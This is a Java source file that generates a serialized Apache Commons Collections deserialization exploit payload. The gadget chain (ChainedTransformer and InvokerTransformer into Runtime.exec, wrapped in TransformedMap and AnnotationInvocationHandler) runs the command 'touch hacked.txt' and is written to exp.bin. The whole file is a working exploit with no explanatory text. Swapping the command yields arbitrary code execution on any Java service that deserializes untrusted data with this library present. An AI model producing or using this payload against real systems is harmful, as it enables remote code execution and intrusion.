/*
 * Main.java
 * Copyright (C) 2022 root <>
 *
 * Distributed under terms of the MIT license.
 */

package com.Exp;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.lang3.SerializationUtils;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.security.Key;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class
                 },
                 new Object[] { "getRuntime", null }),
                 new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class
                 },
                 new Object[] { null, null }),
                 new InvokerTransformer("exec", new Class[] { String.class }, new Object[] {
                 "touch hacked.txt" })
        });
        HashMap innerMap = new HashMap();
        innerMap.put("value", "2");
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        FileOutputStream f = new FileOutputStream("exp.bin");
        ObjectOutputStream oos = new ObjectOutputStream(f);
        oos.writeObject(ins);
        oos.flush();
        oos.close();
    }
}
